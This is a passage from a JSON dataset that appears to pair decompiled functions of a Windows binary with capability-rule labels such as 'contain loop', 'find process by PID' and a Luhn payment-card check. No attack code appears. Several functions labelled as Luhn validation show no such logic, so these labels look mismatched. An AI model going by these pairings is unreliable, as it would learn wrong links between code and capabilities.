        "decompiled_code": "\nulong fcn.00060b04(int64_t *arg1)\n\n{\n    code *pcVar1;\n    ulong uVar2;\n    \n    if ((*(*arg1 + 0x20) < 0x61) || (pcVar1 = *(*arg1 + 0x60),  pcVar1 == NULL)) {\n        uVar2 = 0x21590001;\n    }\n    else {\n        uVar2 = (*pcVar1)();\n    }\n    return uVar2;\n}\n",
        "token_count": 108
    },
    "00061384": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00061384(int64_t **arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = fcn.00060a14(arg1);\n    if (iVar1 == 0) {\n        (**(**arg1 + 0x7c))(arg1, arg2);\n        fcn.00031108(*arg1 + 1);\n    }\n    return;\n}\n",
        "token_count": 90
    },
    "00061528": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nulong fcn.00061528(int64_t arg1, ulong noname_1, uint *arg3, uint *arg4)\n\n{\n    uint16_t uVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    ulong uVar4;\n    int64_t iVar5;\n    uint64_t uStack56;\n    \n    if (noname_1 == '\\0') {\ncode_r0x0006153e:\n        uVar4 = 0x215900c8;\n    }\n    else {\n        uStack56 = 0;\n        iVar5 = fcn.00061b04(arg1, 0x3a);\n        if (iVar5 != 0) {\n            uVar2 = fcn.00061484(arg1);\n            uStack56 = uVar2 << 0x10;\n            if (uVar2 == 0) goto code_r0x0006153e;\n            arg1 = iVar5 + 1;\n        }\n        uVar3 = fcn.00061c0c(arg1);\n        uVar1 = fcn.0002fd20(uVar3);\n        *arg3 = 1;\n        uStack56 = uStack56 | uVar1;\n        *(arg3 + 1) = 0xe;\n        *(arg3 + 2) = uStack56;\n        *(arg3 + 6) = 2;\n        arg3[4] = 0;\n        *(arg3 + 5) = 0;\n        *arg4 = 0x16;\n        uVar4 = 0;\n    }\n    return uVar4;\n}\n",
        "token_count": 352
    },
    "00061648": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint64_t fcn.00061648(ulong arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    uint32_t uVar1;\n    uint64_t uVar2;\n    ulong in_stack_00000028;\n    ulong in_stack_ffffffffffffff60;\n    uint uVar3;\n    uchar auStack104 [16];\n    uchar auStack88 [16];\n    uint auStack72 [2];\n    ulong uStack64;\n    uchar *puStack56;\n    uint uStack48;\n    ulong uStack40;\n    ulong uStack32;\n    \n    uVar3 = in_stack_ffffffffffffff60 >> 0x20;\n    fcn.000619f0(auStack104, arg1);\n    puStack56 = auStack104;\n    auStack72[0] = 0x30;\n    uStack64 = 0;\n    uStack48 = 0x40;\n    uStack40 = 0;\n    uStack32 = 0;\n    uVar2 = fcn.0001dda0(arg4, 0xc0000000, auStack72, auStack88, 0, CONCAT44(uVar3, 0x80), 3, 3, 0, arg3, arg2);\n    if (uVar2 == 0) {\n        uVar1 = (*_fcn.00011138)(*arg4, 0xc0000000, 0, 0, in_stack_00000028, 0);\n        uVar2 = uVar1;\n        if (uVar1 != 0) {\n            fcn.000619de(*arg4);\n            *arg4 = 0;\n        }\n    }\n    return uVar2;\n}\n",
        "token_count": 373
    },
    "00061770": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00061770(ulong arg1, ulong arg2, ulong arg3)\n\n{\n    ushort uVar1;\n    uint uVar2;\n    int64_t arg3_00;\n    \n    arg3_00 = fcn.0002fbc4(0x25);\n    if (arg3_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        fcn.00061a56(arg3_00, 0, 0x25);\n        *(arg3_00 + 5) = 0x11;\n        *(arg3_00 + 8) = *0x15bf0;\n        *(arg3_00 + 0x10) = *0x15bf8;\n        uVar1 = *0x15c00;\n        *(arg3_00 + 6) = 8;\n        *(arg3_00 + 0x18) = uVar1;\n        uVar2 = fcn.00061648(arg1, 0x25, arg3_00, arg2);\n        fcn.0002fc50(arg3_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 259
    },
    "00061804": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint fcn.00061804(ulong arg1, ulong arg2, int64_t arg3, ulong arg4)\n\n{\n    uchar uVar1;\n    uint uVar2;\n    int64_t arg3_00;\n    \n    arg3_00 = fcn.0002fbc4(arg3 + 0x1c);\n    if (arg3_00 == 0) {\n        uVar2 = 0xc000009a;\n    }\n    else {\n        fcn.00061a56(arg3_00, 0, arg3 + 0x1c);\n        *(arg3_00 + 5) = 0x10;\n        *(arg3_00 + 8) = *0x15b80;\n        *(arg3_00 + 0x10) = *0x15b88;\n        uVar1 = *0x15b90;\n        *(arg3_00 + 6) = arg3;\n        *(arg3_00 + 0x18) = uVar1;\n        fcn.000619f6(arg3_00 + 0x19, arg2, arg3);\n        uVar2 = fcn.00061648(arg1, arg3 + 0x1c, arg3_00, arg4);\n        fcn.0002fc50(arg3_00);\n    }\n    return uVar2;\n}\n",
        "token_count": 301
    },
    "0001fa18": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0001fa18(ulong *arg1, ulong arg2, ulong arg3, ulong *arg4)\n\n{\n    uint *in_stack_00000028;\n    \n    while( true ) {\n        if (arg1 == NULL) {\n            return 0;\n        }\n        if (*(arg1 + 1) == arg2) break;\n        arg1 = *arg1;\n    }\n    if (*(arg1 + 0xc) != arg3) {\n        return 0;\n    }\n    *arg4 = arg1[3];\n    if (in_stack_00000028 != NULL) {\n        *in_stack_00000028 = *(arg1 + 2);\n    }\n    return 1;\n}\n",
        "token_count": 156
    },
    "0001fe7c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid fcn.0001fe7c(int64_t arg1)\n\n{\n    uint32_t *puVar1;\n    uint32_t uVar2;\n    \n    if (arg1 != 0) {\n        puVar1 = *(arg1 + 0x10);\n        if (puVar1 == NULL) {\n            uVar2 = 0;\n        }\n        else {\n            uVar2 = *puVar1;\n        }\n        *(arg1 + 0xc) = uVar2;\n        *(arg1 + 8) = uVar2;\n        for (; puVar1 != NULL; puVar1 = *(puVar1 + 6)) {\n            if (*puVar1 < *(arg1 + 8)) {\n                *(arg1 + 8) = *puVar1;\n            }\n            uVar2 = *puVar1;\n            if (*(arg1 + 0xc) <= uVar2 && uVar2 != *(arg1 + 0xc)) {\n                *(arg1 + 0xc) = uVar2;\n            }\n        }\n    }\n    return;\n}\n",
        "token_count": 236
    },
    "00020000": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nint32_t fcn.00020000(int64_t arg1, ulong arg2)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    \n    if ((arg1 != 0) && (piVar2 = *(arg1 + 0x10),  piVar2 != NULL)) {\n        do {\n            if (*piVar2 == arg2) break;\n            piVar2 = *(piVar2 + 6);\n        } while (piVar2 != NULL);\n        if (piVar2 != NULL) {\n            iVar1 = -1;\n            if (0x2b < piVar2[3]) {\n                iVar1 = piVar2[3];\n            }\n            return iVar1;\n        }\n    }\n    return -1;\n}\n",
        "token_count": 167
    },
    "0003bdb0": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0003d58e)\n// WARNING: Removing unreachable block (ram,0x0003d597)\n\nvoid fcn.0003bdb0(int64_t arg1)\n\n{\n    int64_t **ppiVar1;\n    int64_t *arg1_00;\n    int64_t iVar2;\n    ulong *puVar3;\n    ulong *arg1_01;\n    int64_t *piVar4;\n    uchar auStackX24 [16];\n    \n    arg1_00 = *(arg1 + 0x28);\n    fcn.00031564(0x7b540, auStackX24, 1);\n    piVar4 = *0x7b560;\n    if (*0x7b558 != 0x7b558) {\n        do {\n            if (arg1_00 == piVar4) goto code_r0x0003d581;\n            ppiVar1 = piVar4 + 1;\n            piVar4 = *ppiVar1;\n        } while (*ppiVar1 != 0x7b558);\n        piVar4 = NULL;\ncode_r0x0003d581:\n        if (piVar4 != NULL) {\n            iVar2 = *arg1_00;\n            piVar4 = arg1_00[1];\n            *piVar4 = iVar2;\n            *(iVar2 + 8) = piVar4;\n            fcn.00031598(0x7b540, auStackX24, 1);\n            fcn.00031564(arg1_00 + 0xd0, auStackX24, 0);\n            arg1_01 = arg1_00[0xd6];\n            while (arg1_01 != NULL) {\n                puVar3 = *arg1_01;\n                fcn.0002fc50(arg1_01[3]);\n                fcn.0002fc50(arg1_01);\n                arg1_01 = puVar3;\n            }\n            fcn.00031598(arg1_00 + 0xd0, auStackX24, 0);\n            fcn.000315d4(arg1_00 + 0xd0);\n            fcn.0003de70(*(arg1_00 + 0xc9), *(arg1_00 + 0x64c));\n            fcn.0003d070(*(arg1_00 + 0xca), *(arg1_00 + 0x654), *(arg1_00 + 0xc9));\n            fcn.0002fc50(arg1_00);\n            return;\n        }\n    }\n    fcn.00031598(0x7b540, auStackX24, 1);\n    return;\n}\n",
        "token_count": 592
    },
    "00045c30": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint64_t fcn.00045c30(uint64_t arg1, ulong arg2, ulong arg3)\n\n{\n    uint64_t uVar1;\n    int64_t iVar2;\n    int64_t **ppiVar3;\n    uint32_t auStackX32 [2];\n    int64_t iStack72;\n    uchar auStack64 [8];\n    int64_t **appiStack56 [2];\n    \n    iStack72 = 0;\n    appiStack56[0] = NULL;\n    if (*0x7b88c != '\\0') {\n        uVar1 = fcn.00045078(arg1);\n        if (uVar1 != 0) {\n            return uVar1;\n        }\n        fcn.00031564(0x7b290, auStack64, 0);\n        iVar2 = fcn.00036bf8(arg1 & 0xffffffff, 1);\n        if (((iVar2 == 0) || (*(iVar2 + 0xc) != 0)) || (iVar2 = *(iVar2 + 0x450),  iVar2 == 0)) {\n            fcn.00031598(0x7b290, auStack64, 0);\n            return 0xc000000e;\n        }\n        if ((*0x7b880 == 0) || ((*0x7b880 <= *(iVar2 + 0xa8) && (*(iVar2 + 0xa8) < *0x7b888 + *0x7b880)))) {\n            fcn.00031598(0x7b290, auStack64, 0);\n            if (iVar2 != 0) {\n                (**0x11040)(auStackX32, appiStack56, *0x7b898, arg2, arg3);\n                if ((auStackX32[0] == 0) && ((**0x110a8)(auStackX32, &iStack72),  auStackX32[0] == 0)) {\n                    *(iStack72 + 0x60) = 0;\n                    fcn.0002ed80(iStack72 + 0x68);\n                    for (ppiVar3 = appiStack56[0]; *ppiVar3 != NULL; ppiVar3 = *ppiVar3) {\n                    }\n                    if (*(iStack72 + 8) == 0) {\n                        *(iStack72 + 0x10) = ppiVar3;\n                    }\n                    *ppiVar3 = *(iStack72 + 8);\n                    *(iStack72 + 8) = appiStack56[0];\n                    *(iStack72 + 0x28) = 0;\n                    (**(iVar2 + 0xa8))(iVar2, &iStack72, 1);\n                    fcn.0002ee4c(iStack72 + 0x68, 0xffffffff);\n                    auStackX32[0] = *(*(iStack72 + 0x2a) + 0x20 + iStack72);\n                }\n                else {\n                    fcn.00031598(0x7b290, auStack64, 0);\n                }\n                if (appiStack56[0] != NULL) {\n                    (**0x11110)(appiStack56[0]);\n                }\n                if (iStack72 != 0) {\n                    fcn.0002edfc(iStack72 + 0x68);\n                    (**0x11060)(iStack72);\n                }\n                return auStackX32[0];\n            }\n            return 0xc0000225;\n        }\n        fcn.00031598(0x7b290, auStack64, 0);\n    }\n    return 0xc0000001;\n}\n",
        "token_count": 811
    },
    "00049b80": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint32_t fcn.00049b80(uint64_t arg1, uchar *arg2)\n\n{\n    uint8_t uVar1;\n    int32_t iVar2;\n    uint64_t uVar3;\n    int64_t in_GS_OFFSET;\n    uchar auStack152 [24];\n    ulong uStack128;\n    uchar *puStack120;\n    int32_t iStack112;\n    uchar auStack104 [72];\n    \n    uVar1 = (**0x111f0)();\n    if (arg1 == *(in_GS_OFFSET + 0x52)) {\n        iStack112 = (*0x49b3c)(arg2);\n    }\n    else {\n        (*_fcn.00011600)(auStack152, 0, 0);\n        uStack128 = 0x49b3c;\n        puStack120 = arg2;\n        (**0x11608)(auStack104, 0x1a428, auStack152);\n        uVar3 = 0;\n        (**0x11610)(auStack104, 2);\n        (**0x11618)(auStack104, uVar3 & 0xffffffffffffff00 | arg1 & 0xff);\n        (**0x11620)(auStack104, 0, 0);\n        do {\n            arg2 = auStack152;\n            iVar2 = (**0x111e8)(arg2);\n        } while (iVar2 == 0);\n    }\n    (*_fcn.000111e0)(arg2 & 0xffffffffffffff00 | uVar1);\n    return ~-(iStack112 != 0) & 0xc0000001;\n}\n",
        "token_count": 353
    },
    "0005fa5c": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0005fa5c(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x78798;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 2)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x78708) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 281
    },
    "0005fa68": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0005fa68(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x78798;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 3)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x78708) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 280
    },
    "0005fa74": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nulong fcn.0005fa74(int64_t arg1)\n\n{\n    char cVar1;\n    char cVar2;\n    char **ppcVar3;\n    ulong *puVar4;\n    char *pcVar5;\n    int64_t iVar6;\n    \n    puVar4 = 0x78798;\n    do {\n        for (ppcVar3 = *puVar4; (ppcVar3 != NULL && (pcVar5 = *ppcVar3,  pcVar5 != NULL)); ppcVar3 = ppcVar3 + 0x14) {\n            iVar6 = arg1 - pcVar5;\n            do {\n                cVar1 = *pcVar5;\n                cVar2 = pcVar5[iVar6];\n                if (cVar1 != cVar2) break;\n                pcVar5 = pcVar5 + 1;\n            } while (cVar2 != '\\0');\n            if ((cVar1 == cVar2) && (*(ppcVar3 + 1) == 4)) {\n                return *(ppcVar3 + 0xc);\n            }\n        }\n        puVar4 = puVar4 + -2;\n        if (puVar4 < 0x78708) {\n            return 0;\n        }\n    } while( true );\n}\n",
        "token_count": 280
    },
    "00030f70": {
        "rules": [
            "find process by PID"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00030efd)\n// WARNING: Removing unreachable block (ram,0x00030f0f)\n// WARNING: Removing unreachable block (ram,0x00030f3e)\n\nulong fcn.00030f70(uchar *arg1, int64_t arg2)\n\n{\n    int32_t iVar1;\n    int64_t iVar2;\n    ulong uStackX32;\n    \n    if ((arg1 != NULL) && (arg2 != 0)) {\n        if (*0x7afd0 != 0) {\ncode_r0x00030ef9:\n            iVar2 = (*_fcn.000113b8)();\n            fcn.00061b0a(arg1, *0x7afd0 + iVar2, arg2);\n            arg1[arg2 + -1] = 0;\n            return 1;\n        }\n        iVar1 = (*_fcn.00011210)(&uStackX32, 0, 0, 0, 0, 0x30e20, 0x7afd0);\n        if (iVar1 == 0) {\n            fcn.00061aa4(uStackX32, 0, 0);\n            fcn.000619de(uStackX32);\n            if (*0x7afd0 != 0) goto code_r0x00030ef9;\n            *arg1 = 0;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 315
    }
}